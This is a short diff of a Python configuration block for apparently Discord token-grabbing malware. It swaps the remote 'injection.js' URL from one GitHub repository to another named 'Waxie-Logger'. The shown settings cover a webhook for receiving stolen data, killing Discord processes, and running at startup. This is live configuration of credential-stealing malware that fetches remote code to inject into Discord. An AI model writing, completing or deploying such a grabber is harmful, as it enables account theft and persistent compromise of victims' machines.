@@ -23,7 +23,7 @@ config = {
     # replace WEBHOOK_HERE with your webhook ↓↓
     'webhook': "31",
     # keep it as it is unless you want to have a custom one
-    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
+    'injection_url': "https://raw.githubusercontent.com/ERTYUOAF/Waxie-Logger/main/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
     # if you want the file to run at startup
